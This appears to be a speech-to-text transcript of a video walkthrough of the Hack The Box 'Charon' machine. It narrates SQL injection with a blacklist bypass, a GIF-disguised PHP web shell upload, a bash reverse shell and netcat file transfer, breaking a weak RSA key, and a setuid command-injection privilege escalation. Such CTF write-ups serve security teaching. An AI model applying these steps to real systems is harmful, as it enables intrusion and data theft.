 what's going on YouTube this is epic and we're gonna be doing the Karen machine from hack to box this box got a lot of eight because it has some things that people absolutely hate dealing with the first thing you're greeted with is a exploitable service that's a rabbit hole which means no matter how hard you exploit it you're not gonna get any useful information out of it and it's up to you to know when you've tried enough and you should move on to the next thing and it really highlights the importance of always having some type of enumeration running in the background then once you do that you agreed with another exploitable service that's configured in an odd way that you never never see in the real world but it's configured that way so you can't use automated tools against it easily so that's the second piece the third piece just a weird thing you'd only ever see in the CTF and then after that it's all downhill from there you got some crypto that is fun to do and a exploitable binary that you have to do a light reverse-engineering on it's a hard box but a great learning experience so let's jump in like every other box we're gonna start with an maps or save script sv4 numerate version Oh a I'll put all formats give it a name and the IP address of Charon which is ten ten ten thirty one not gonna run it because it may take well let's just look at the output we see it is listening on port 22 and 80 that is SSH and HTTP HTTP is the thing that is most interesting so that's we're gonna look at first so going to the IP address we're greeted with a web page the very first thing I want to do is tell my proxy to spider the host and call the web page and that's going to accumulate all the links for that page so may take well nice to run the background and the first thing I look for is like a copyright or some type of information the copyright is important because I can kind of get a feel of when the page was last updated if I saw like 2014 I know it's probably gonna be a public vulnerability because that is old but I don't see that what I do see is super CMS so I want to find out what super CMS is because if I find the code on the internet I can try to figure out what version is running on this web server and if it's a old version there may be security patches and the changelog I can go and look and see what they changed and find an exploit that way or I can just search exploit DB and know right away so let's Google super CMS and see what comes back we see to get hubs right off the bat so going to both of them once they load come on that's taken a while so scroll down is there anything else that one's interesting I actually didn't see this is a write-up I won't if that looks familiar some exploits is that's a package list why is this taking so long but proxies off my internet is just dead refreshing all these there we go so this is actually a spoiler it looks like this machine is very similar to this just looking over those sequel queries when was this released January 6 2017 which is before this so if someone found this this would easily tell you how to exploit one of the later steps I believe I wish I looked at this before but anyways I digress let's look at what the actual code is the first project we do see composer json composer is a PHP framework so it could be this go into all these folders we see this apache rewrite rule and it's rewriting super CMS static to be slash files so let's go into the static directory this is as see we don't care about that static we see J s and jQuery so slash files J s and then jQuery JavaScript doesn't exist going in the book we do have a list of all the pages we were able to find the J s directory is not underneath a directory called files so let's just get rid of files it's not there and let's just do static in case they don't have that rewrite rule not there so it's not this application we can close out of this and go into the next github by Johnny blue this one's not so obvious what it's coded in but it is PHP going to index dot PHP and glancing through the code at the very bottom we do see it is coding nighter which is another PHP framework so go back and let's open up each of these directories to see if anything looks familiar views view sounds like it would be good and going through this we see everything's dot PHP files and going into book we have bunch of dot HTML so I'm gonna say it's probably not this so right off the bat we ruled out the possibility of having do static code analysis of this box or find public vulnerabilities etcetera so we probably spent five to ten minutes maybe and ruled out what could be 30 minutes of work so the next thing is to only run go Buster I did not so while that goes let's just run go Buster's see if we can identify other pages so up go Buster - W user share word list Buster and you can use like Derb wwws get Buster it's what have you familiar with I just might go Buster before doing this so directly we're due 2.3 small that's you for URL HTTP 10 10 10 31 and let that run let's name this go Buster and create a new tab so that's gonna go in the background while we start playing with things HTML files aren't that interesting to us we want ones that we can submit content to that have which would be this PHP file we see single post on PHP we can submit the parameter ID and give it a value 10 11 or 12 so we're going to do is go to that page and we could just go write input and cheat and get this request and sent to repeater but I like actually seeing it to know what I'm looking at before I send it so we go to one of these pages and let's turn intercept on be fresh and then we can copy to file and we'll call this single post dot request and let's just cheat and run SQL map against this so SQL map - R and specify the login request that we just created single post request - P for parameter and willing to give it ID and it's gonna say it is boolean based blind injectable it detect it was my sequel do you want to keep running tests yes and we also see it is Union injectable so now we can just do - - dump and dump the contents of this database the next thing we can do we see the contents is just one table called blog and then just the post there's no like user credentials things like that if we do sequel map - H we should be able to find the query for dumping user creds if they have any - - passwords so we can try that so instead of dump - - passwords doesn't get anything because we don't have read privilege over the relevant database so can't get pass was out of the state base let's go to - hh4 extended help and see what other parameters look beneficial there is file read potentially reading files off the server so maybe we can read PHP files and that allow us to get the actual contents of the PHP instead of what they produce the difference is you can read like configuration files and potentially get passwords so this one's going to be very good and OS - CMD is gonna be good so let's try this - - file read equals SC passwd and it says it fetched it - here so let's see if anything's actually in it nothing's in it so we can't read follows outside the web directory that's not too interesting we want - - OS - CMD and we'll just do it - Who am I and it's gonna say hey what language does it support because it works by using the in - out file sequel thing to write files to the web server so it's going to try to write like a ASP shell a JSP shell a PHP shell we want to select for for PHP shell and then it's going to say hey do you want us to try to guess the path sure and then the common locations yes we don't want specify and it's trying to drop files - like all the potential web directories for dub dub w/o HTML and next default sov www and at the end it says it wasn't able to write so at this point I'm thinking maybe this is an exploit oh well we a secret map first sequel injection but I haven't been able to get any files and I've done the low-hanging fruit of a sequel injection so let's go back to my other enumeration stuff and see if we have any data and looking at go Buster it's not done yet but we see slash CMS data and that is a new folder to us so let's go and look at what CMS data is I think I've intercept on so turn that off CMS data and we get a forbidden so I'm gonna do another go Buster copy this and we will change this to slash CMS data and we do dash X for extension and PHP what that's going to do is take every item in this directory and append dot PHP to it and try to go to it and the CMS directory right off the bat we do get a login dot PHP so let's go right there and it also told us it was 300 200 which was ok not the 400 error so let's go back here and we get a login prompt the first thing I look at on a login panel is just default credentials like admin admin or admin password and once those don't work I may set up Hydra to brute-force different credentials or use sequel map on this page in the sake of time I know this isn't multiple and I'm gonna click this forgot password link and we're going to just try put random stuff in this password field and we get incorrect format and to make it a bit easier let's real quick setup burp to intercept send this and send it to repeater so we've got the incorrect format if this was in the form of an email because that's what it's asking for we get user not found with that email if I do a single quote we get error and database if I do a double quote I get user not found so we want to play it around with that error in database because all sequel injection is is examining how the server behaves and now we just triggered it to go down a different path and we want to see if we can get this error out so let's try adding a comment with - - space - and we do user not found with that email so what do we think has happened let's create a new tab here and we'll call this explanation so the sequel syntax we can google this real quick my sequel select syntax it's a really good page or it should bring us to a good page turn intercept off and this shows how the sequel query is formulated so you serve with sequel you have some options I've never really used the Select expression this will be a column name from which table where you can group it by certain things and ascending or descending order having another condition order it again ascending descending limit is really useful we'll use that and then it has like in two out file which allows you to potentially write to the hard drive SQL map did we tried that with OS CMD tried to drop PHP shells but didn't work so this is handy because if you have like sequel injection in here group by ascending you know you can't do any of the queries back here and union is right here where the where condition is I'm not sure why it's not shown here if we click on this Union it's a bit odd but Union fits after where so if you have sequel injection here you can do all the things down below but you can't go up if that makes sense so let's write what we think a query is so it's a select and then probably user name from well guess the tables called users because we're giving it an email that's giving us a user name we're email is equal to user input so what we did is we changed user input to be ASD at be calm and a single quote so we have three quotes here and if you've ever done anything with programming or just scripting you know having the odd number of quotes is a very bad thing so that's why we had the error in database because this is an invalid query and then when we added the comment with - - base - it took this comment out and now this became the query and that's a valid one so what I'm going to do now is run this in sequel map so if we go back here we can copy to file forgot that request if we cat this that was odd let's remove that and we'll do this because I think that's stuff for artifacts from previous things so because I just had that highlighted and I think I found out why never copied the file cuz I tend to highlight things and it only copy pieces so don't highlight anything do forgot requests and we have it awesome the sequel map to work well it doesn't want any weird things it just wants a legitimate query so sequel map - are for the request forgot - P we want to inject - email we can do all tasks with risk for level 3 a level 4 risk 3 should do all tests and then we'll do - test batch to say hey don't ever ask us a question just always assume the default because this is just background enumeration and we don't want to be bothered so user not found what we have to do now is see if we can do a union injection and what unions going to do is going to override what the database says to us so we can do this really quickly and then explain it more so if we go back to 10 10 10 31 going this yogurt shop go to a blog post and SQL map did a union injection so we know there's five columns in this table and that becomes important because you have to brute force the number of columns in the table because if you have the wrong number columns it airs out so if we do 10 Union select one nothing goes in this page error 2 here 3 4 5 because this has 5 columns and the Siebel query did not error out we didn't overwrite anything but if we didn't select a valid blogpost let's just select 42 we see we had complete control over what got displayed and if we do like a sequel syntax like version it outputs the sequel version running on the server so that's a union and we'll go more in-depth right now so Union select 1 again we have to find out how many columns is in the table users what we think is users and we get error and this is a unique thing because we didn't get this before if we just mess with a query we get user not found and if we have a bad query Aaron database so I'm thinking that's some type of blacklist and we just used a bad word so I'm going to put Union in the email and see if it works it does so I'm going to put space Union space so Union surrounded by spaces and we get that error message so that is a bad character to have or a bad word so what we're going to do let's try to change the case let's just do one lower case letter and usually not found so they have a black list of bad words but it's not case-sensitive so we can bypass that filter by just changing the case awesome so union with one lower case and then select one should get aaron database and we also have to be wary to always put this comment afterwards because we have the single quote there right again here in database select to select three select for incorrect format so this is a different message this is good to know so let's try changing the format a at b.com didn't inject there so let's copy this put this back to one but hey at be calm here and i'm just assuming the format should be an email it may not be but based upon the functionality is page it sounds like it should be an email or it feels like so three didn't work for and there we go so we know this query is returning four items and the last item is an email address and we can kind of show that by if we go back to this frozen yogurt page and we move the version let's do four but the version at four instead of five you see that's the fourth parameter it's pulling and that's why it over wrote there so that's why we didn't see any email sent until we did the fourth one because this is the one that should be in the form of an email so that's all good we can control the output but how do we send information back to us because if we just put version here we get nothing so what we're going to do is use concat so go back to the explanation tab if we do concat a comma B that's going to give us a B we do version B it's gonna give us version B so what we have to do is find table information and input that as this user portion of the email so check there's my sequel didn't work let's see says it wants us to rerun provide a valid thing for string and we know that if it says incorrect it may be valid so that's what we're gonna add so - that string and valid on sequel map let that run the background maybe it'll get something maybe it won't but let's look into a very important table in my sequel and that is the information schema table then we just do information sequel schema my sequel look at this this is a database that has information about all tables columns users etc and my sequel and one very cool table is the columns table this table has table schema it's gonna say the database name that's what table schema means it's gonna have the table name and it's gonna have the column name so these three things is everything we need to dump a database so if we go back into I guess sequel Maps not gonna work we can ignore that one of those should have worked but it's still a pain so go back in the book and we want to say we're going to grab the cat of was it schema name is at the table table schema table schema then table name and column name and we also have to have at b.com tailing it so the issue with this can capped right now is these are all going to blend together really well so we're gonna add a colon between them and that should be good so we can copy this replace that with a can cat and now we have to do from information schema dot columns so this is going to be select then these items table schema table name column name from the database dot columns and that should be it let go we get error so I'm guessing one of these is a bad word change the case again on information and it works but we get a user not found so one other thing we forgot to do is put a limit because right now this query is going to return hundreds of rows and when it returns all the hundreds of rows into one parameter it may turn that into like an array or something and do some type of type confusion so we want that to just be one row because that's what the script is expecting to receive so we're just gonna do limit one and now we get email sent to information schema which is the table schema then you got that colon character sets which is the table name and column name but this information schema table is noisy so we want to just do where table schema does not equal information schema and now we got super CMS groups group ID so this is the very first column now the issue is we could do limit one ascending order by was it group ID is that what it is and limit one PI goes after that was the sequel syntax so order by is before limit but it has a space and was it just bailed group ID let's get rid of this was the table GOP ID so where would a by GOP oh what a by column ascending nope what does he get rid of that order blye I'm not thinking straight right now we're gonna do the easy way and we can just say hey there's another command call it off set and that's going to get the row number so limit one's always going to return one row offset zero is going to return the very first drawer of that offset one the second row three it's so on so very first drill is what we see the group ID go to the next row by changing offset we got user ID go to the next row license key and so on so what we want to do is automate this because there could be thousands of rows we never know so I'm going to copy as a curl command and we call this columns dot SH and just do a simple bash script oh that Co is ugly so we're gonna mainly do this because it's not too hard so put this in the very first thing I want to do is I want to get rid of all these double quotes I have I only want to use one type of quote because I'm gonna do a payload equals and I don't want to bother about xkp anything so I can show you real quick for I and see second zero hundred do payload equals so right now this is gonna air out because I'm trying to have this string and I have this double quote and it's going over here and getting terminated right here I don't want that so if I do bash columns I don't think they're actually aired huh - were smart enough to not do that that's weird what I was going to say is is gonna convert all these to be single quotes certain have to worry about that but Union select it didn't put at b.com and double quotes and I want that to be it's not perfect so this is still going to air because it just took all the quotes out by default that was weird so what we're going to do percent ask for a search and replace and we do escape double quote and replace it with escape single quote G now all double quote all double question the singles now I can put that to show what exactly it was talking about so here's the new one when I replaced all doubles with single quotes and we have quotes around these colons and quotes around this email and those were the two important things I noticed that would have caused an error so now we got the payload now let's go to curl - s for silent - D for data payload and then HTTP 10 10 10 31 CMS data forgot dot PHP option D is unknown wait what option - that's gonna be unknown less data there's gonna do - - data Oh No hey probably wants this in quotes so he passed this as one argument because we have a bunch of spaces in payload so that should work yep we're getting a bunch of data but it's returning all that HTML so what we want to do is grab for what we want so we can type this grant - OH - only show us what we search for and we want to say this dream begins with a space goes until what do we have be calm and try this now we're doing anything okay so we have something here so let's just grab food be calm we have an error in our call because we should get that because we have and injecting there so sexy row 2-0 do columns get rid of the grep and see what the page is saying I think we have to have at least one okay so we can search for incorrect no email now something went wrong oh wait not even know why I looped that cuz I don't even have that there let's go payload oh it was equal to email there we go this should work yep so crap now we want that okay you only returned two columns which is odd let go payload oh that's not odd because I turned my sequence there we go and now we can dump all the columns and tables in this database so we have groups licensed operators and operators has username and password these the ones that are of interest to me so that's what we're going to look at and dump those next so if we go back into a boat we want to do let's see the stable in column soken cat and we want to get this one too so operators know we won't use a name so first is column so I'm just going to score user name underscore that's obnoxious and password let's go ahead Squa password underscore get rid of that so now we're selecting the username and password and we also have to append that be calm from we're no longer information schema columns we are going from super CMS operators super CMS operators this where statement is gone get rid of these lines go and we've got first one test one and then looks like an md5 sum so this is the new payload so we're going to copy columns to users SH and modify the payload payload equals and I use double quotes here again shoot single quote single quote and that should be good so now when I run my users dot Sh we're dumping a bunch of users and let it only do test one Wow offset I so dumping all the test users and it's all this same hash if we grab this and just google it we get the password is I believe password Dakotah value is password but if we dump more of these will actually find a different user so let's do that and dump the whole table say 1000 I will just do 300 will be kind and we get the very last one which is super CMS admin and a different password so change this search for this md5 sum see if this site has it doesn't look like it so just google it and we get the hash it is tomorrow t a.m. ARR oh so if we log in to that website has super CMS admin we should be closed super CMS admin password tomorrow who is the username a DM super CMS a DM password tomorrow and we're logged in awesome this is the only part of the challenge I really didn't like because this is very CTF like we have this page if we try to edit this nothing here this is another rabbit hole there is a upload image file and if you look at the page source you have this input type hidden' equals name and a base64 thing so if we echo - an base64 - d test file one is the name so let's go into burp options intercept and go back to this page refresh yeah Terry I stepped on a fresh food upload now we can edit this request take these comments out we don't need to do this anymore names do input name and that's equal to test file one forward turn acept off and now we have another parameter which will be a file name so we'll just do test dot PHP or do EPS X dot PHP and browse we have to do a shell so locations hot shell PHP and I'm gonna do I think CMD PHP JPEG is what I want so if we do CMD PHP jpg the very first thing it says is gift 8 and what gif 8 does if you put that in the file and makes file recognize it as a image because that is the magic byte for a gif so that's the contents of the shell I'm uploading and go here paste this and I guess we can try just submitting and see what it says success so it uploaded if set dot PHP if we tried PHP script like CMD dot PHP let's see Unicode text submit doesn't know well if we edit this take the magic bite out we get only image files so that was one of the bypasses you had to do is have this shell script act like a PHP and also do that hidden parameter really stupid so now we wanted to look and would it up Pluto rather than my clip would know HTTP history Peter go what are you planning to images if sec dot PHP intercept off and I got my shell do Oh hips a key equals LS was it just it was the contents of my shell requests tab so now we have command execution on this web server so what we want to do is a reverse shell so let's go to pen test monkey we can just do a shell cheat sheet and I'm going to use this one basis in let's try an intercept on I have much better luck when doing this over a post request so I'm going to change a quest to post URL decode this so we can edit it because we have to change our IP so 10 10 puts our IP 14:30 will say port 8081 set the show that looks off ok yeah you will encode this and see LVN P listen on 8081 go got a shell so now we can do Python - C employed PT y PT y dot spawn then bash sty echo and I did ctrl Z to background that and then I type that foreground and now I have a fully interactive shell so we can go to /home go and decoders directory and see we get permission denied there is a decoder pub and pass doc Quint if we can't decoded a pub we get a public key and cat pass doc crypt we get gibberish I thought that was supposed to be hex yeah it's weird that my cat was showing it like that but we're gonna transfer both those files to my local box so we can work with them so deep base 64 both of them copy yeah yeah crypto the what was this called to code it up Pub we want that to be dot base64 go back here 364 past our crypt paced starting to basics before - d on decoded pub and then a stock crypt what okay it just had a space at the end that's what complained about so we got all the files we needed I made the crypto directory but didn't put files there so decoder and pass and crypto go in a crypto and now we can begin with doing this so if you are lost in the previous parts of the video I have some bad news this is where we do the crypto and it's I just don't have a good way to explain it the good news is crypto problems are so common there's a lot of frameworks and tools out there that just have a easy mode button we'll do that first using the RSA CTF tools that is on github if you just google RSA CTF util or maybe it's tool not util and I think my intercept is on RSA CTF tool you can download it and it's going to make it easy so we can look at decoder dot pub this is a RSA key and it is I think 256 bit and then we have past crypt which is the encrypted contents we just xxt that we can see it's a bit more than cat is showing but either way we're going to use up RSA CTF tool and then RSA CTF told by we can just specify - - public key and it's going to be decoded pub and then - - unsafe er past crypt let this run and it's already reversed it so the password is never mind Oh probably one never mind the bollocks or no mind the bollocks I don't think that one is supposed to be there but that's the cheating way to do this entire problem because if we now SSH decoder at 1010 1031 type never mind the bollocks we get in but we don't want to do the cheat way we won't actually figure out what RSA is doing so our assay is a lot of math and it's really just prime number of factorization which means you take a really big number and then find two different Prime's that when multiplied together they equal that number so sounds really easy but if you knew how to do this efficiently with giant numbers or essay is completely dead this is a 256 bit key I think and that is doable very quickly as you saw first a CTF tool did that behind the scenes so we're going to use first go into Python and we're going to do from crypto public key import RSA and import a piece of RSA we're going to do F for file open decoder pub and we want that to be read and then we can do key is equal to RS a dot import key F dot read now we should be able to print values so the two values we need of a key is N and is that giant number that is in the public key and we have that right here the other number is going to be e and that's why I can be like 6 5 5 3 7 I think is the common one yeah almost all the time E is gonna be equal to this and it looks like a big number but to give you an idea let's import my ssh private key so it's root not ssh ID or i say dot Pub I think is the location re-import the key key dot and and we can see a much much larger number than this and then key dot e still six five five three seven again he's probably not going to change so let's split this window and V notes and put n is equal to I cannot copy that hit that down still can't copy okay that was weird so that's what I am is equal to and we can also do e e is equal to six five five three seven okay so now we have to find it the two factors that equal a two prime numbers that equal that when multiplied together that window is doing something really odd but oh well oops I'm gonna use MS iëve to do this and if I just do that give it the prime number this should find it automatically oh crap it's finally not going to if we look in the log because I gave it an equals let's see what happened see okay what did it actually do that yeah it still found it so we got the two factors these two numbers when multiplied together will equal that end and I've no clue why my vited that again but go multiply that by this and we get eight five one six one one go to the window down here eight five one so we found the two prime factors and we can name them P and Q so paste Q paste let's just behaving better so we got all the numbers we need to actually generate the private key the fact that we're able to get P and Q that's really all you need and this alone pretty much gives you the private key so we have to give a few more variables to make or equations look better we have to give it and well we have n we could have just done N equals P Q but we have answer it doesn't matter we'll need M and this is going to be n minus P plus Q minus 1 and go to Google we have to Google for a function the modular multiplicate I can't pronounce this but modular multiple every time I try to multiplicative inverse function in Python this is the function we want one like that so set paste pieces in okay we need an import or si so from crypto public-key import for si and then we need to calculate D which is equals mod and II M he is that exponent up there M is what we just typed that small equation and he is equal to RS a construct and long e D P Q print key export key see if that works it'll be a miracle if that does MV notes to Jen keep I python Genki no construct takes exactly two arguments and six given so let's see I say construct and there we go we have a private key like magic just generated so if we go into the crypto directory let's move that here to be consistent we can create a private key so decoder deprived approve and now we can use open SSL so open ssl RSA util - decrypt and key Dakota dot prove and we will direct a stock clip to it and we get never mind the bollocks so that is the RSA portion if you want to do it by hand sorry I don't even know fully what goes on in my head to health or I say fully works other than lots of math lots of copy and pasting off other people's work and magic so we can finally ssh into ten ten ten thirty one as the dakota user this videos got long so i'm going to cheat and we're going to jump right to how to exploit the previs without doing a bunch of enumeration so we do sudo - l never mind the bollocks or whatever you say and we see Karen cannot decode it cannot run sudo on Karen so the next thing I look for is set UID binaries so fine / - perm anything with the set UID bit set pipe standard error to DES null and we see user local been super shell so I execute the program see it wants a command so we give it ID very beta doesn't give us any output touch slash temp slash hip sack I last last tap that work says usage super shell and only once one command so we will give it one command a one argument nope does not work so let's see what Super Show actually does in order to do that we have to get it to a computer so we're gonna base 64 use the local bin super shell pipe that to netcat 10 10 14 30 is our IP 80 82 is the port we'll use step in netcat listener so LNP 80 82 pipe everything to super she'll be 64 or direct not plate and a sent it so now we can cat cat super she'll be 64 have a file base 64 - d2 decode it super shell so file everything set and if we wanted to we could use binary ninja if we have it use this first because it makes it a bit easier nice visual interface it does cost a little bit of money though so clicked over to go to the main function and we see this nice pretty call graph or whatever this is called so function main we saw this when we gave it two arguments we went down here and exited so I'm guessing right here this is comparing the number of arguments versus two or more and then exiting so if we gave it three yeah yeah that has to be what that's doing so scroll down not sure what this is doing right here we see something on its loading slide spin /ls and then immediately calling a compare function and before that we'll doing these two I would have to guess that this is loading AG 1 into r ax 7 7 is the number of bytes slash bin slash LS is so I'm guessing it's going to compare these two strings or at least the first 7 bytes and if that is true then we go if that is I hate doing this boolean logic explaining it if slash bin slash if the argument has slash bin slash LS in it it's going to go down to here and we're going to call printf set UID so we're going to escalate to the owner of this file and then send it to system if not then exit so that's radar if you that's binary ninja if you didn't have binary ninja and one do something free you can use radar or two and then the binary name we're going to have to analyze everything or tell it to analyze everything so eight eight a and then you can print functions with AFL and that's going to be analyze function list and we can see all the functions that's what was in the left side of binary ninja we're going to do and the V enter and this is going to bring us to visualization mode and then P will cycle different panes to show different views of it if you do capital V it brings you to the little graphs of each function you can do lowercase V I think and now we can just go down to which function we want so sim main and then hit G to go and we get to that nice graph if you didn't want to go through this because this is definitely a of Lists you could hit a colon and then ask for a search or a seek I don't know which one space sim main or whatever your function name is hit enter hit enter again to get out of this enter commands and it also jumps you there and we can see the same exact thing so if there's more than one argument call the usage then exit this one still don't know but it exits if whatever happens here then we have it loading pin OS and RDI loading an argument into rx-7 into edx doing the compare and if there's two strings equal the same thing we call printf set u ID and system so that is radar exit this go back to our s SH and let us exploit this program so now we know we need slash bin slash LS and does an LS of our current directory so let's do root we get the usage that's right everything has to be one argument so send it in quotes and this way when the program reads these arguments this appears as just one argument despite it containing a space and we can see root text so if we go cat then LS and we can do slash say do the command Who am I and this is going to error because it cannot access slash decoder what happened was our terminal processed Who am I so they just do echo Who am I let's do bash echo Who am I it goes the decoder we don't want a terminal processing this so if we do echo backslash so am i let's put that in quotes another quote it echoes s and this is what we want because when we do this is going to send that to the syscall so user local and super shell spin LS / backslash Who am I and then the dope quote so before her terminal right now process it decoder then sent slash bin slash iOS slash decoder to super shell which then ran system against that now we're going to be sending slash bin slash LS / dollar sign Who am I and it does a thin LS on slash route so we verified we have code execution as route we just can't do anything useful yet so we can change that to be whatever we want so cat slash route / route text and we have code execution because we now just catted the route text file if we really wanted to we could do something like this chmod for 755 on EPS AK stamp Zack and then when I do LS dash L a we have upset with the sticky bit set and the owners not root so we can just do CH own root root flashtab hip sack and now we have that file with the sticky bit see looks like the not sticky bit cent UID bit set so yeah that is the Box hope you guys enjoyed it and take care actually not goodbye yet because I know people are gonna ask what the whole set UID thing was let's just show it real quick so we have GCC and store the machine so we can write a quick C program so we're gonna write hip sect C and we're just going to do each I have two spaces there whoops there we go Maine and set UID 0 set g ID 0m p 0 system and bash v p fine okay GCC - Oh she'll hip sexy I think I've can't have that capital not having the history is annoying why didn't that work no semicolon okay we've got the shell so if I just execute this no is gonna happen because it doesn't have the sticky bit or not stick set UID bit and it's not owned by root so let's do the super shell LS and then we will CH own root root to be on shell okay olá oh wait this needs to be slash bin slash LS so now I am not doing well on this one back slash between before the dollar sign now it should be owned by root there we go and we have to just do one last thing and chmod it so chmod four seven five five the for this is the set UID bit style la we now have the set UID bit set so now when I execute shell I am route I can do anything I want so now that is it for the video I hope you guys enjoyed take care bye